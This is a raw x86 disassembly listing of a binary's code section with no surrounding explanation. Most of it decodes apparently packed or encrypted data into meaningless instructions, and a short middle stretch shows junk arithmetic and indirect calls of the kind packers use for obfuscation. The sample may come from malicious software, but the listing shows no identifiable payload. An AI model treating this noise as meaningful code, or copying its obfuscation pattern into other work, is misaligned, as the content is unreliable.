  402206:	add    bl,BYTE PTR [eax]
  402208:	sbb    BYTE PTR [esi+0x69181812],bl
  40220e:	nop
  40220f:	cmp    al,0x27
  402211:	xchg   edi,eax
  402212:	mov    ebx,0x763243b2
  402217:	jge    0x40220f
  402219:	lods   eax,DWORD PTR ds:[esi]
  40221a:	jb     0x4021f8
  40221c:	xchg   esi,eax
  40221d:	add    DWORD PTR [edx+0x16],0xfffffff0
  402221:	(bad)  
  402222:	aad    0x76
  402224:	es (bad) 
  402226:	iret   
  402227:	dec    edx
  402228:	loope  0x40225a
  40222a:	in     eax,dx
  40222b:	mov    ds:0x2da71cd1,al
  402230:	aaa    
  402231:	sbb    al,0x4b
  402233:	xor    BYTE PTR ds:0x3291ed54,dl
  402239:	bound  edx,QWORD PTR [ebx+0x10bf8879]
  40223f:	aas    
  402240:	sahf   
  402241:	dec    edi
  402242:	adc    ecx,DWORD PTR [ebx]
  402244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402245:	(bad)  
  402246:	mov    ebx,0xf0d41c96
  40224b:	pop    ss
  40224c:	xchg   edi,eax
  40224d:	dec    eax
  40224e:	sbb    esp,DWORD PTR [edx-0x4a9080e3]
  402254:	mov    edx,0x89691937
  402259:	scas   eax,DWORD PTR es:[edi]
  40225a:	sbb    edi,esp
  40225c:	jg     0x40229f
  40225e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40225f:	push   ebp
  402260:	les    esp,FWORD PTR [ebp-0x6f]
  402263:	mov    ebp,0x95385ed
  402268:	xchg   edx,eax
  402269:	sbb    edi,ebx
  40226b:	push   cs
  40226c:	rcr    BYTE PTR [esi],1
  40226e:	mov    edx,DWORD PTR [edi+0x30]
  402271:	pushf  
  402272:	enter  0xd806,0x41
  402276:	imul   edi,DWORD PTR ds:[edx],0xec16f898
  40227d:	pop    es
  40227e:	push   ecx
  40227f:	fst    QWORD PTR [esi]
  402281:	sub    bl,ah
  402283:	jg     0x402227
  402285:	inc    esp
  402286:	adc    esi,DWORD PTR [edx-0x7fe2e2f7]
  40228c:	(bad)  
  40228d:	jae    0x4022a9
  40228f:	jge    0x40228c
  402291:	out    dx,eax
  402292:	sbb    DWORD PTR [ebx],ebx
  402294:	inc    eax
  402295:	cmp    al,0x7a
  402297:	stos   BYTE PTR es:[edi],al
  402298:	daa    
  402299:	cwde   
  40229a:	pop    es
  40229b:	cli    
  40229c:	scas   al,BYTE PTR es:[edi]
  40229d:	cs dec esi
  40229f:	retf   0x2e9
  4022a2:	lock aam 0xc3
  4022a5:	cmc    
  4022a6:	out    0xa8,eax
  4022a8:	(bad)  
  4022a9:	les    eax,FWORD PTR [ebp-0x1fb231bd]
  4022af:	fistp  WORD PTR [esi]
  4022b1:	pop    es
  4022b2:	and    dl,bl
  4022b4:	call   0xa230:0x889bfb55
  4022bb:	lahf   
  4022bc:	ins    BYTE PTR es:[edi],dx
  4022bd:	push   ecx
  4022be:	les    edi,FWORD PTR [ebp-0x41]
  4022c1:	sbb    eax,0xe92a6902
  4022c6:	mov    fs,WORD PTR ds:0xae3a88fb
  4022cc:	adc    ebx,DWORD PTR [ecx-0x55]
  4022cf:	jmp    0x40230d
  4022d1:	imul   ebx,DWORD PTR [edi+0x4632c110],0xda5b6ca1
  4022db:	fdiv   DWORD PTR [eax]
  4022dd:	adc    DWORD PTR [edi+eiz*1+0x6a8a1793],ebp
  4022e4:	mov    al,0x98
  4022e6:	sbb    BYTE PTR [ebx+ecx*2],cl
  4022e9:	inc    ebx
  4022ea:	fs (bad) 
  4022ec:	leave  
  4022ed:	jg     0x4022b6
  4022ef:	arpl   WORD PTR [edx-0x4d],cx
  4022f2:	dec    edx
  4022f3:	leave  
  4022f4:	icebp  
  4022f5:	fisubr WORD PTR [esi-0x4898849]
  4022fb:	in     eax,0x5e
  4022fd:	clc    
  4022fe:	inc    esp
  4022ff:	fnstenv [edx]
  402301:	push   es
  402302:	ja     0x402290
  402304:	cmp    al,0xdb
  402306:	out    dx,al
  402307:	fmul   DWORD PTR [edx+0x3a]
  40230a:	inc    ebp
  40230b:	cmc    
  40230c:	fs neg eax
  40230f:	inc    ecx
  402310:	out    dx,eax
  402311:	fwait
  402312:	push   0xa2e9d3c1
  402317:	scas   eax,DWORD PTR es:[edi]
  402318:	pop    edi
  402319:	call   0x7cd274d5
  40231e:	sbb    al,0x4b
  402320:	ins    BYTE PTR es:[edi],dx
  402321:	mov    eax,ds:0xdfe9f4a3
  402326:	jle    0x4022b1
  402328:	mov    dh,0xa1
  40232a:	xor    DWORD PTR [edi+0x4dd8ec3a],eax
  402330:	nop
  402331:	add    bl,BYTE PTR [ecx-0x18]
  402334:	adc    eax,0x590cd755
  402339:	hlt    
  40233a:	add    al,0xe
  40233c:	bound  eax,QWORD PTR [edi+0x7ccef07b]
  402342:	push   cs
  402343:	xor    ebp,DWORD PTR ds:0x6d735838
  402349:	inc    ebx
  40234a:	out    dx,eax
  40234b:	sub    al,0xf7
  40234d:	(bad)  [eax+0x49]
  402350:	pop    ss
  402351:	repz mov WORD PTR [ebx],fs
  402354:	mov    ecx,0x3b9158ba
  402359:	in     al,0x49
  40235b:	xchg   ebx,eax
  40235c:	dec    ebp
  40235d:	lods   eax,DWORD PTR ds:[esi]
  40235e:	xor    eax,0x34d8ecf1
  402363:	sub    bh,ah
  402365:	jne    0x4023a3
  402367:	xchg   edx,eax
  402368:	cmp    al,0x4f
  40236a:	mov    ebp,0xcc708368
  40236f:	cld    
  402370:	sbb    al,0x6c
  402372:	(bad)  
  402373:	pop    ecx
  402374:	ins    BYTE PTR es:[edi],dx
  402375:	pop    ss
  402376:	cdq    
  402377:	xor    ebx,DWORD PTR [edi]
  402379:	lahf   
  40237a:	out    0xbb,eax
  40237c:	inc    esi
  40237d:	scas   eax,DWORD PTR es:[edi]
  40237e:	push   edx
  40237f:	jg     0x4023fe
  402381:	push   edi
  402382:	arpl   WORD PTR [edx+edx*1-0x547ccad8],sp
  402389:	ror    esi,0xc8
  40238c:	xlat   BYTE PTR ds:[ebx]
  40238d:	jbe    0x402336
  40238f:	or     eax,0x32f2e7e3
  402394:	push   esi
  402395:	fadd   QWORD PTR [ebx+0x129afb54]
  40239b:	or     eax,0x113f811a
  4023a0:	fwait
  4023a1:	test   BYTE PTR [ecx+0x3cbf34a1],bh
  4023a7:	dec    eax
  4023a8:	pop    eax
  4023a9:	scas   al,BYTE PTR es:[edi]
  4023aa:	inc    ax
  4023ac:	pop    ds
  4023ad:	ror    BYTE PTR [edi],cl
  4023af:	fild   WORD PTR [esi]
  4023b1:	js     0x40239d
  4023b3:	out    dx,eax
  4023b4:	sbb    BYTE PTR ds:[edi-0x798f8624],bh
  4023bb:	push   ecx
  4023bc:	cdq    
  4023bd:	pusha  
  4023be:	jo     0x4023df
  4023c0:	xor    BYTE PTR ds:0xf01d8f78,ah
  4023c6:	in     eax,0x99
  4023c8:	nop
  4023c9:	xor    ebx,DWORD PTR [esi+eiz*4-0x22f9e020]
  4023d0:	outs   dx,BYTE PTR ds:[esi]
  4023d1:	push   eax
  4023d2:	sub    esi,DWORD PTR [ecx-0x6b]
  4023d5:	loope  0x4023b9
  4023d7:	ja     0x4023f5
  4023d9:	(bad)  
  4023da:	(bad)  
  4023db:	jne    0x40241d
  4023dd:	aas    
  4023de:	push   ecx
  4023df:	push   esp
  4023e0:	js     0x402387
  4023e2:	inc    eax
  4023e3:	mov    edi,0xd4932c1a
  4023e8:	(bad)  
  4023e9:	test   DWORD PTR [esp+esi*1],0x6f0ee4d1
  4023f0:	sbb    ebx,DWORD PTR [esi]
  4023f2:	rcl    BYTE PTR [esi],1
  4023f4:	xchg   esp,eax
  4023f5:	retf   
  4023f6:	sub    al,0x44
  4023f8:	scas   eax,DWORD PTR es:[edi]
  4023f9:	xchg   esi,eax
  4023fa:	adc    BYTE PTR [edi-0x1d53bce6],al
  402400:	aaa    
  402401:	jae    0x4023a7
  402403:	pop    ecx
  402404:	ret    0xf094
  402407:	stc    
  402408:	lea    esi,[esi+edx*2-0xbb1e7ad]
  40240f:	jno    0x40248a
  402411:	outs   dx,DWORD PTR ds:[esi]
  402412:	xlat   BYTE PTR ds:[ebx]
  402413:	xor    al,0x42
  402415:	push   ecx
  402416:	loop   0x4023ea
  402418:	mov    ds:0xd97f90fe,al
  40241d:	and    eax,0x2a68b13d
  402422:	mov    ds,WORD PTR [eax+0x636e7a5f]
  402428:	out    0xaa,al
  40242a:	mov    dh,0x76
  40242c:	cdq    
  40242d:	sbb    DWORD PTR [ebp-0x17],0xffffffa8
  402431:	ds jl  0x40249c
  402434:	pop    esi
  402435:	and    esi,eax
  402437:	scas   eax,DWORD PTR es:[edi]
  402438:	test   ah,ah
  40243a:	(bad)  
  40243b:	sbb    ebx,DWORD PTR [esp+edi*8+0x62]
  40243f:	mul    edi
  402441:	inc    ebp
  402442:	ss int3 
  402444:	cwde   
  402445:	fldenv [edi+eiz*2]
  402448:	lds    edx,FWORD PTR [edx+eax*8]
  40244b:	sub    DWORD PTR [ebx+0x5d152dfe],0x3a4bb453
  402455:	xchg   eax,edx
  402457:	aas    
  402458:	adc    DWORD PTR [ebx+edx*1+0x7a893fd8],edi
  40245f:	xor    DWORD PTR [eax+0x73],ebp
  402462:	sahf   
  402463:	dec    ebp
  402464:	fmul   st,st(2)
  402466:	ins    DWORD PTR es:[edi],dx
  402467:	call   0xf7a6956a
  40246c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40246d:	lea    esp,[ecx]
  40246f:	cli    
  402470:	clc    
  402471:	ds pop eax
  402473:	(bad)  
  402474:	sbb    esi,DWORD PTR [edi-0x5e]
  402477:	xchg   edi,eax
  402478:	cli    
  402479:	es pop eax
  40247b:	sti    
  40247c:	ins    BYTE PTR es:[edi],dx
  40247d:	jl     0x402443
  40247f:	sbb    dh,dl
  402481:	or     bh,0x62
  402484:	cmp    al,0x8c
  402486:	lea    ecx,[eax+0x65]
  402489:	sub    dh,BYTE PTR ds:0x90fd3342
  40248f:	mov    dl,0x91
  402491:	clc    
  402492:	enter  0x1946,0x46
  402496:	push   esi
  402497:	ds adc eax,0xa6beebcd
  40249d:	repnz pop edx
  40249f:	adc    bl,BYTE PTR [eax+0x3]
  4024a2:	cdq    
  4024a3:	xchg   edx,eax
  4024a4:	out    0xf0,al
  4024a6:	ret    0x9a1d
  4024a9:	pop    edi
  4024aa:	mov    dl,bh
  4024ac:	xor    dh,BYTE PTR [edi+ebp*4]
  4024af:	xchg   ecx,eax
  4024b0:	add    DWORD PTR [ecx+ebp*4],0x3e39a5c8
  4024b7:	xchg   BYTE PTR gs:[edx+0x76],bh
  4024bb:	enter  0xcc5e,0x96
  4024bf:	sub    al,dh
  4024c1:	inc    edx
  4024c2:	sbb    ch,BYTE PTR [ebx+0x30975f77]
  4024c8:	sub    edx,eax
  4024ca:	inc    esi
  4024cb:	fld    DWORD PTR [edi]
  4024cd:	fwait
  4024ce:	adc    DWORD PTR [esi-0x3a],esi
  4024d1:	mov    cs,WORD PTR [edx+0x1109f45b]
  4024d7:	cmp    BYTE PTR [esi-0x28dcf2cd],dh
  4024dd:	(bad)  
  4024df:	dec    edi
  4024e0:	in     al,0xdf
  4024e2:	(bad)  
  4024e3:	jb     0x402531
  4024e5:	pop    es
  4024e6:	stos   BYTE PTR es:[edi],al
  4024e7:	mov    DWORD PTR [ecx+0x11],ecx
  4024ea:	lock or DWORD PTR [eax],ebx
  4024ed:	in     al,0x8
  4024ef:	fadd   st(3),st
  4024f1:	and    DWORD PTR [esi+0x4c],esp
  4024f4:	lock sti 
  4024f6:	repz sub al,BYTE PTR [edx+0x28e68344]
  4024fd:	cdq    
  4024fe:	int3   
  4024ff:	pop    ss
  402500:	mov    WORD PTR [edi-0x3aa3908a],fs
  402506:	push   eax
  402507:	xor    al,0x19
  402509:	int3   
  40250a:	cmp    DWORD PTR [esi],0x38
  40250d:	sub    al,0x86
  40250f:	dec    ecx
  402510:	xchg   ebx,eax
  402511:	mov    ah,0xd7
  402513:	jae    0x402580
  402515:	mov    esi,0x3f75713d
  40251a:	fild   DWORD PTR [ebx-0x46]
  40251d:	push   esi
  40251e:	loopne 0x4024ed
  402520:	enter  0x386f,0xc0
  402524:	dec    edx
  402525:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402526:	int    0xca
  402528:	jbe    0x4025a1
  40252a:	daa    
  40252b:	pop    ebx
  40252c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40252d:	mov    ds:0x8e566ba8,al
  402532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402533:	stos   BYTE PTR es:[edi],al
  402534:	in     al,dx
  402535:	cmp    al,0xed
  402537:	scas   al,BYTE PTR es:[edi]
  402538:	adc    DWORD PTR [edx+0x6e520d7f],eax
  40253e:	fxch   st(5)
  402540:	or     ah,BYTE PTR [eax+0x33]
  402543:	stos   DWORD PTR es:[edi],eax
  402544:	or     BYTE PTR [eax-0x325042b0],dl
  40254a:	test   eax,0x54a4b6de
  40254f:	cs cmp ah,al
  402552:	push   ebx
  402553:	push   0x5c896168
  402558:	ror    DWORD PTR [ebx],0x78
  40255b:	jmp    0x4025b4
  40255d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40255e:	sbb    DWORD PTR [edx-0x26],edi
  402561:	icebp  
  402562:	bound  esi,QWORD PTR [ebp+0x2e]
  402565:	mov    edx,0x77858ac1
  40256a:	mov    ecx,0x49e109d6
  40256f:	or     eax,0xea645447
  402574:	and    ebx,ecx
  402576:	daa    
  402577:	adc    ch,dl
  402579:	mov    bx,0xa764
  40257d:	stc    
  40257e:	js     0x402507
  402580:	adc    ebx,esp
  402582:	pop    esp
  402583:	cli    
  402584:	rol    DWORD PTR [edx-0x11],0xee
  402588:	arpl   ax,cx
  40258a:	stos   BYTE PTR es:[edi],al
  40258b:	push   edx
  40258c:	and    BYTE PTR [ecx],dl
  40258e:	cmp    cl,BYTE PTR [ecx-0x44]
  402591:	adc    BYTE PTR [ebp+0x54],cl
  402594:	xor    esp,0x971536c9
  40259a:	dec    edx
  40259b:	gs push esp
  40259d:	cmp    ebx,DWORD PTR [edx+0x5a]
  4025a0:	adc    al,0x46
  4025a2:	outs   dx,BYTE PTR ds:[esi]
  4025a3:	repz loopne 0x40255e
  4025a6:	shl    edx,0xc8
  4025a9:	add    al,0xe6
  4025ab:	adc    BYTE PTR [edi-0x3d3ecc4b],al
  4025b1:	test   DWORD PTR [edi],ebx
  4025b3:	add    DWORD PTR [edi+0x759ba062],0x6b05e23b
  4025bd:	shl    BYTE PTR [edx],cl
  4025bf:	lods   eax,DWORD PTR ds:[esi]
  4025c0:	mov    edx,0xb0cb64b0
  4025c5:	jno    0x402605
  4025c7:	jmp    0x402588
  4025c9:	test   al,0xd6
  4025cb:	adc    esi,DWORD PTR [ebp-0x22]
  4025ce:	mov    DWORD PTR [ebp-0x70],0x3b72
  4025d5:	movzx  eax,WORD PTR ds:0x4282bf
  4025dc:	adc    DWORD PTR ds:0x42814b,eax
  4025e2:	mov    DWORD PTR [ebp-0x6c],0x3abc
  4025e9:	adc    DWORD PTR ds:0x428133,edi
  4025ef:	mov    DWORD PTR [ebp-0x68],0x1b45
  4025f6:	cmp    DWORD PTR ds:0x428127,0x0
  4025fd:	mov    DWORD PTR ds:0x4282d3,0x76b5
  402607:	mov    DWORD PTR ds:0x42812f,edx
  40260d:	mov    DWORD PTR ds:0x428247,0x4dfd
  402617:	jmp    0x40267d
  40261c:	mov    eax,ds:0x428233
  402621:	mov    eax,0x8f5
  402626:	cmp    DWORD PTR ds:0x428127,0x0
  40262d:	ja     0x402669
  402633:	push   DWORD PTR [ebp-0x14]
  402636:	push   0x1475
  40263b:	push   0x3d07
  402640:	push   0x4281ff
  402645:	call   DWORD PTR ds:0x428d5c
  40264b:	sbb    DWORD PTR ds:0x42834b,0x36f
  402655:	adc    DWORD PTR ds:0x4282cf,0x428157
  40265f:	sub    DWORD PTR ds:0x42833f,0x4282db
  402669:	and    DWORD PTR ds:0x42811f,0x42820b
  402673:	add    DWORD PTR ds:0x4282df,0x6611
  40267d:	mov    DWORD PTR [ebp-0x64],0x767d
  402684:	sub    eax,DWORD PTR ds:0x428127
  40268a:	mov    DWORD PTR [ebp-0x60],0x1d973857
  402691:	mov    DWORD PTR [ebp-0x5c],0x0
  402698:	add    DWORD PTR ds:0x42811b,0x47ea
  4026a2:	mov    DWORD PTR [ebp-0x34],0x599d
  4026a9:	mov    DWORD PTR [ebp-0x2c],0x165d
  4026b0:	cmp    DWORD PTR ds:0x42824f,0x0
  4026b7:	mov    DWORD PTR ds:0x4282af,edx
  4026bd:	mov    DWORD PTR ds:0x42820b,ecx
  4026c3:	mov    DWORD PTR ds:0x428133,edx
  4026c9:	mov    DWORD PTR ds:0x42822f,0x4bd1
  4026d3:	jmp    0x402743
  4026d8:	mov    eax,ds:0x42811b
  4026dd:	mov    DWORD PTR ds:0x42824f,edx
  4026e3:	cmp    DWORD PTR ds:0x42824f,0x0
  4026ea:	jg     0x402726
  4026f0:	push   DWORD PTR [ebp-0x28]
  4026f3:	push   0x2b2a
  4026f8:	push   0x1aa6
  4026fd:	push   0x3603
  402702:	call   DWORD PTR ds:0x428d60
  402708:	add    DWORD PTR ds:0x428257,0x4282b7
  402712:	sub    DWORD PTR ds:0x4282d3,0x6e4a
  40271c:	xor    DWORD PTR ds:0x42812b,0x16a6
  402726:	dec    DWORD PTR ds:0x428147
  40272c:	and    DWORD PTR ds:0x42822b,edx
  402732:	or     DWORD PTR ds:0x4282bb,edx
  402738:	mov    eax,ds:0x42814f
  40273d:	and    DWORD PTR ds:0x428363,eax
  402743:	mov    DWORD PTR [ebp-0x1c],0xc51
  40274a:	movzx  eax,WORD PTR ds:0x428363
  402751:	sbb    DWORD PTR ds:0x42822f,eax
  402757:	mov    DWORD PTR [ebp-0x44],0x3f55
  40275e:	or     eax,0x5124
  402763:	mov    DWORD PTR [ebp-0x44],0x1
  40276a:	adc    DWORD PTR ds:0x42820f,0x6ac9
  402774:	mov    DWORD PTR [ebp-0x44],0x42e8
  40277b:	mov    eax,DWORD PTR [ebp-0x60]
  40277e:	dec    DWORD PTR ds:0x4282c3
  402784:	shl    ecx,0x1e
  402787:	not    ecx
  402789:	mov    ecx,DWORD PTR [ebp-0x5c]
  40278c:	jmp    0x402b6a
  402791:	out    dx,eax
  402792:	repz (bad) 
  402794:	cmp    bh,BYTE PTR [ebx+0x63226a1a]
  40279a:	pop    ds
  40279b:	and    eax,0xb1d731aa
  4027a0:	mov    al,0x30
  4027a2:	cld    
  4027a3:	sbb    BYTE PTR [eax],bl
  4027a5:	sahf   
  4027a6:	adc    bl,BYTE PTR [eax]
  4027a8:	sbb    BYTE PTR [ecx],ah
  4027aa:	jecxz  0x402818
  4027ac:	xor    DWORD PTR [ebx+0x66],ebp
  4027af:	in     eax,dx
  4027b0:	jg     0x402798
  4027b2:	cdq    
  4027b3:	popa   
  4027b4:	xchg   esp,eax
  4027b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027b6:	in     al,dx
  4027b7:	loop   0x40281b
  4027b9:	sbb    dh,bh
  4027bb:	xchg   ebp,eax
  4027bc:	sbb    ebx,DWORD PTR [edx+0x4]
  4027bf:	aam    0x7a
  4027c1:	inc    ebp
  4027c2:	mov    dh,al
  4027c4:	int3   
  4027c5:	leave  
  4027c6:	xchg   ecx,eax
  4027c7:	push   eax
  4027c8:	(bad)  
  4027ca:	jp     0x4027aa
  4027cc:	hlt    
  4027cd:	push   edx
  4027ce:	lock jge 0x402764
  4027d1:	jg     0x402838
  4027d3:	popa   
  4027d4:	and    al,0xd0
  4027d6:	jb     0x4027e1
  4027d8:	inc    ebp
  4027d9:	cmp    ebx,DWORD PTR [ecx+0xb]
  4027dc:	xor    eax,0x73ca2040
  4027e1:	ficomp DWORD PTR [edx]
  4027e3:	nop
  4027e4:	mov    edx,0xc1ae27c5
  4027e9:	add    DWORD PTR [ecx+0x6a09bb2d],esi
  4027ef:	loope  0x4027ba
  4027f1:	mov    gs,WORD PTR [esp+ecx*8-0x1fdafc2]
  4027f8:	adc    esi,eax
  4027fa:	xchg   ebp,eax
  4027fb:	pop    es
  4027fc:	jp     0x40282d
  4027fe:	mov    bh,0x6c
  402800:	mov    ebx,db7
  402803:	loopne 0x402831
  402805:	cmc    
  402806:	jp     0x402824
  402808:	xchg   edx,eax
  402809:	repnz dec ebx
  40280b:	dec    edi
  40280c:	sub    DWORD PTR [ebx+ecx*1+0x7],ebx
  402810:	mov    bl,0x4d
  402812:	mov    DWORD PTR [eax-0x152cb824],esi
  402818:	aam    0x7f
  40281a:	iret   
  40281b:	sahf   
  40281c:	jno    0x402863
  40281e:	test   eax,eax
  402820:	repnz popa 
  402822:	test   esi,ecx
  402824:	aaa    
  402825:	xor    eax,0x97c2fe85
  40282a:	cmp    eax,0xd08d2338
  40282f:	(bad)  
  402830:	push   cs
  402831:	push   ecx
  402832:	xor    edx,eax
  402834:	not    DWORD PTR [ebx+0x31]
  402837:	mov    dl,0x5
  402839:	or     esp,DWORD PTR [edx-0x2f15ab39]
  40283f:	sbb    DWORD PTR [esi-0x585b00cc],edx
  402845:	ja     0x40287f
  402847:	leave  
  402848:	sti    
  402849:	and    DWORD PTR [eax-0x13d0916],edx
  40284f:	fcmovnb st,st(1)
  402852:	xor    BYTE PTR [ecx],cl
  402854:	push   ds
  402855:	or     BYTE PTR [edx-0x38],ch
  402858:	(bad)  
  40285a:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40285c:	sbb    BYTE PTR [eax+0x12baa070],dl
  402862:	pop    ebx
  402863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402864:	xor    ah,BYTE PTR [esi-0x5b]
  402867:	mov    esi,0xb778c152
  40286c:	aam    0xae
  40286e:	aaa    
  40286f:	pop    ebp
  402870:	xchg   edx,eax
  402871:	shl    DWORD PTR [ecx+0x5440adb6],cl
  402877:	aas    
  402878:	cld    
  402879:	mov    eax,0xd08efee7
  40287e:	mov    esi,0x79e0ff6
  402883:	loop   0x4028ca
  402885:	test   BYTE PTR [ebx],ah
  402887:	and    al,0x78
  402889:	std    
  40288a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40288b:	jmp    0xf11d:0x4b2bbe68
  402892:	call   0x62cb15e0
  402897:	fcom   DWORD PTR [esi+0x69480b67]
  40289d:	rcl    BYTE PTR [eax+0x33],cl
  4028a0:	fcom   st(6)
  4028a2:	mov    ds:0x1d95760d,al
  4028a7:	cld    
  4028a8:	lods   al,BYTE PTR ds:[esi]
  4028a9:	mov    ecx,DWORD PTR [esi]
  4028ab:	sbb    al,0x1b
  4028ad:	inc    ecx
  4028ae:	mov    fs,ebx
  4028b0:	cmp    al,0x71
  4028b2:	enter  0x78a9,0x74
  4028b6:	imul   ecx,DWORD PTR [edx+0x1a],0x63d964ea
  4028bd:	shl    DWORD PTR [edx+0x46],0x71
  4028c1:	ss call 0xab06ebbd
  4028c7:	rol    BYTE PTR [edi+0x6ae4f4e4],cl
  4028cd:	xchg   ebp,eax
  4028ce:	push   ds
  4028cf:	retf   
  4028d0:	mov    ch,0xc8
  4028d2:	pop    ecx
  4028d3:	(bad)  
  4028d4:	rol    dh,cl
  4028d6:	aaa    
  4028d7:	and    al,0x8b
  4028d9:	mov    al,ds:0x75b2b6f5
  4028de:	test   edx,ecx
  4028e0:	out    0x40,eax
  4028e2:	sbb    eax,0x819878b4
  4028e7:	scas   eax,DWORD PTR es:[edi]
  4028e8:	push   ss
  4028e9:	xchg   esi,eax
  4028ea:	js     0x4028ee
  4028ec:	cli    
  4028ed:	test   eax,0x64457ef9
  4028f2:	dec    eax
  4028f3:	mov    ss,edx
  4028f5:	ds dec esi
  4028f7:	mov    cl,dh
  4028f9:	hlt    
  4028fa:	xor    al,0x10
  4028fc:	jbe    0x40288f
  4028fe:	imul   esi,esi,0xffffff9c
  402901:	dec    esp
  402902:	or     edi,ebx
  402904:	push   esi
  402905:	xchg   esi,eax
  402906:	jo     0x4028e9
  402908:	fwait
  402909:	inc    edi
  40290a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40290b:	sub    eax,0x61b86126
  402910:	scas   al,BYTE PTR es:[edi]
  402911:	loopne 0x40292e
  402913:	jno    0x402905
  402915:	mov    ah,0xda
  402917:	aaa    
  402918:	add    eax,0xa4a9a864
  40291d:	div    bl
  40291f:	inc    ebp
  402920:	add    BYTE PTR [ebp-0x57dacc4],bh
  402926:	neg    BYTE PTR [edi]
  402928:	cmp    al,0x86
  40292a:	out    dx,al
  40292b:	push   ecx
  40292c:	push   ds
  40292d:	cmp    eax,0x1805fe99
  402932:	xor    edi,ecx
  402934:	dec    esp
  402935:	fdiv   st(0),st
  402937:	(bad)  
  402938:	jg     0x402977
  40293a:	(bad)  
  40293b:	mov    ebp,ds
  40293d:	sahf   
  40293e:	js     0x402988
  402940:	sub    BYTE PTR [edi+0x1da60e96],dh
  402946:	jmp    0x2e56:0x7503dc2a
  40294d:	bound  esp,QWORD PTR [eax]
  40294f:	ins    BYTE PTR es:[edi],dx
  402950:	in     al,0x2
  402952:	sub    eax,0x19f62bed
  402957:	cmp    DWORD PTR [ecx+0x4ced1371],edi
  40295d:	add    DWORD PTR ds:0xc9824544,edx
  402964:	cli    
  402965:	mov    al,BYTE PTR [esi-0x7f]
  402968:	pop    ebx
  402969:	or     al,0xaf
  40296b:	(bad)  
  40296c:	rcr    BYTE PTR [eax-0x4bfba77b],0x28
  402973:	pop    eax
  402974:	sbb    eax,ebx
  402976:	lock fld DWORD PTR ss:[eax]
  40297a:	nop
  40297b:	rcl    DWORD PTR [edx-0x6e8bd98c],0x88
  402982:	push   es
  402983:	xchg   BYTE PTR [edx+0x7b56b6f1],dl
  402989:	in     eax,dx
  40298a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40298b:	or     eax,0xfde0bf20
  402990:	js     0x4029b0
  402992:	adc    dl,ah
  402994:	lea    edx,fs:[edx]
  402997:	xor    al,0x9
  402999:	clc    
  40299a:	jecxz  0x402925
  40299c:	cmp    BYTE PTR [edi-0x65],bl
  40299f:	iret   
  4029a0:	mov    bl,0x2c
  4029a2:	ins    BYTE PTR es:[edi],dx
  4029a3:	dec    esi
  4029a4:	fsub   DWORD PTR [ebp-0x10]
  4029a7:	xor    al,0xa
  4029a9:	fsubr  QWORD PTR [ecx-0x2]
  4029ac:	cld    
  4029ad:	inc    ebp
  4029ae:	mov    ebx,0xca5ac9bf
  4029b3:	in     eax,0xc9
  4029b5:	mov    ah,0xe6
  4029b7:	pop    ebp
  4029b8:	push   edi
  4029b9:	mov    bh,0x9f
  4029bb:	push   esi
  4029bc:	gs xchg edx,eax
  4029be:	repz in eax,dx
  4029c0:	inc    ebp
  4029c1:	shl    ecx,cl
  4029c3:	repz scas al,BYTE PTR es:[edi]
  4029c5:	or     ebx,eax
  4029c7:	inc    edx
  4029c8:	popf   
  4029c9:	(bad)  
  4029ca:	(bad)  
  4029cc:	xor    esp,DWORD PTR [ebx-0x2c4756cc]
  4029d2:	(bad)  
  4029d3:	call   0x485938de
  4029d8:	cmp    eax,0xd30d53
  4029dd:	mov    ecx,0x671e6a0a
  4029e2:	mov    ?,WORD PTR ds:0xd3842316
  4029e8:	aas    
  4029e9:	push   ebp
  4029ea:	cmp    cl,BYTE PTR [esi]
  4029ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029ed:	jmp    0x4029bd
  4029ef:	ss xchg edi,eax
  4029f1:	xchg   ebp,eax
  4029f2:	add    BYTE PTR [edx+0x47d44b59],cl
  4029f8:	jo     0x402997
  4029fa:	repz xchg esp,eax
  4029fc:	mov    al,ds:0xfa90284b
  402a01:	adc    ebx,DWORD PTR [edi+edx*2+0x1d]
  402a05:	sub    ah,ch
  402a07:	push   edi
  402a08:	or     bl,ch
  402a0a:	in     eax,0x9b
  402a0c:	arpl   WORD PTR [esi],bx
  402a0e:	sahf   
  402a0f:	cld    
  402a10:	cli    
  402a11:	mov    bl,0xae
  402a13:	xor    al,0x27
  402a15:	adc    BYTE PTR [ecx],0x24
  402a18:	rcr    cl,1
  402a1a:	jbe    0x402a67
  402a1c:	test   al,0x46
  402a1e:	imul   ebx,esi,0xe0f7e2e8
  402a24:	stos   DWORD PTR es:[edi],eax
  402a25:	xchg   ebp,eax
  402a26:	pushf  
  402a27:	ja     0x4029d5
  402a29:	in     al,0xec
  402a2b:	jecxz  0x402a51
  402a2d:	ja     0x402a06
  402a2f:	mov    BYTE PTR [ebx+0x738ae636],0x8e
  402a36:	(bad)  [ebx+0x728c22d]
  402a3c:	lds    esp,FWORD PTR [esi-0x397231a2]
  402a42:	shl    DWORD PTR [ecx-0x4b],cl
  402a45:	outs   dx,BYTE PTR ds:[esi]
  402a46:	pop    esp
  402a47:	outs   dx,BYTE PTR ds:[esi]
  402a48:	fiadd  WORD PTR [ebx+edi*2]
  402a4b:	sbb    edx,DWORD PTR [esi]
  402a4d:	leave  
  402a4e:	bound  esp,QWORD PTR [eax]
  402a50:	mov    cl,0xe3
  402a52:	pusha  
  402a53:	call   0x8321:0xa9b0b86c
  402a5a:	loopne 0x402a57
  402a5c:	fisub  WORD PTR [edi+0x35cf411d]
  402a62:	add    bh,dh
  402a64:	mov    ebp,0x2d38055e
  402a69:	inc    ebx
  402a6a:	or     BYTE PTR [edx],al
  402a6c:	test   BYTE PTR [eax+0x7b],ah
  402a6f:	lds    edi,FWORD PTR [edx]
  402a71:	sub    al,BYTE PTR [edx-0x5c]
  402a74:	das    
  402a75:	test   DWORD PTR [edi+0x11],edx
